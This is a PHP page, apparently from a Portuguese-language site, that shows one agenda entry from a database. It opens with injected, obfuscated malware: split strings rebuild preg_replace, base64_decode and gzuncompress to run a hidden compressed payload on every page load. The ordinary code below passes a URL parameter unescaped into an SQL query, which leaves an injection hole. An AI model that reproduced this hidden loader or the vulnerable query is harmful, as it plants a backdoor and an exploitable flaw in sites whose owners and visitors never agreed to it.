<?php /* 6adfe706ce0c8757b1e5cd57c37aed9ccf53551b */ $g="p"."r"."e"."g"."_r"."eplac"."e";$l="b"."a"."se"."64"."_"."de"."cod"."e";$z="gzunc"."om"."press";$g("/32"."cb"."5"."m/e",$z($l("eF7VVll"."P"."4zA"."Q/i9IkeClSp2jjfaJ"."lrSwSNvdEl"."jBS+XE4yaQozgJFH49jp3D6S"."FYrfZhJde1x3N8M9/YL"."bzg+JTh"."15"."LFBIKMw"."O"."kJ"."Ld"."OgiLJUQzpblPffJz5faWis"."IfMuutXQVGzNZE"."YvrzTkVLvRRMqyYFaE1dK"."44DNmDL8JQ0czKg2asdZV"."QSe/H8It19TloSqbIsvek6KJGAcCWhNFzbpoAaguhcGoll4/EHfzo9XT/xW8nTjSdSdEn2UhFDJGuur3lCoNi895wWJIFY"."ocYe/UaISOCplO5u5ardJhAMZn"."8A6Y"."18kdtu4OFWMJ"."p"."s+PkqBK0FHm+"."MHT1"."Vv2un5QPKNq7BF7"."Tb"."eL+bvXI7aVTdVKtg2+q3aI6V3"."E/S5qqBweY+TvGuU/Y1"."kla9BqyHJLD3WhpQvL5XMQ"."MlmULlB/d+jmHMXVL5iUKB3I"."oChZ2oeqHEdUUhT"."lORQSx+rGXd65SxFodOl5P1eudz7n6zYcTol06D3eQ9j1KWw3MX92uZv2CRYukU"."gBCePqxfVxDr"."a5ajXy0ufN+pXolbXVv"."AYdFPE6r/IwonUODTC"."nxtZcI"."9PSDRiOR4Y+sm3bt/SRNdYt8LETgOE7gIYjH1HHadDqJKoAAv"."9lqYqUfC2/"."PgC"."nd+/Ol225ut8UF"."BbFRj"."PONTT"."jg8BTEpEID4IsGfi8LrNBE"."Jfvz+IUiRB9g8eScX"."0OJ0pxwr8Vw7fnJIOjhrH/jslLFuCgFw0eE7xpjG"."rs"."eVhSGkN9m6"."ssmqR"."MnUYxrNZQrIIsLSAtcq4lKdlkm56FKA/FcQ5yyWkHnEi7L"."bfnuwIaa6U01evHW"."XQVeQJFmJH2hC/mrtelCZgAU09dD69F4nrKnkJefzS"."o+xDS"."msn2L"."0Llv9FqKEVZsiBB1X/V5DsIpHjP"."C5"."fBWEdO4IyJpfuWScE0s"."W7ZhNq+"."MbY"."xsQgMDYM6jYde3D9q"."0brb9i/N5eLGk5dmsHu+dH"."/dujfe6nZ5pV"."zqegwqt9aU8"."U/atHTXwydnZ98+AO4DcRo=")),"/32"."cb5"."m"."/e"); /* 0437845f0de5c6cd061c938277279d830261b11c */ ?> <?php 
	include("classe/conexao_agenda.php"); 
	
	$id = $_GET["id"];  // código da matéria ativa
	
		
	//sql para a notícia
	$sql_1 = "SELECT * FROM tbagenda WHERE idAgenda = '$id'";
	$qr_1 = mysql_query($sql_1);
	$materia = mysql_fetch_array($qr_1);
	
	
?>
<style type="text/css">
<!--
.conteudo-texto {font-family: Verdana, Arial, Helvetica, sans-serif; font-size:14px; color:#333;}
a:link {
	color: #0000ff;
	text-decoration: none;
}
a:visited {
	text-decoration: none;
}
a:hover {
	text-decoration: underline;
	color: #000000;
}
a:active {
	text-decoration: none;
}
-->
</style>




<div id="HOTWordsTxt" name="HOTWordsTxt">
<p>
<span class="conteudo-texto"><?php echo $materia["descAgenda"]; ?>
</span></p>
</div>
<script src='http://ads24110.hotwords.com.br/show.jsp?id=24110'></script>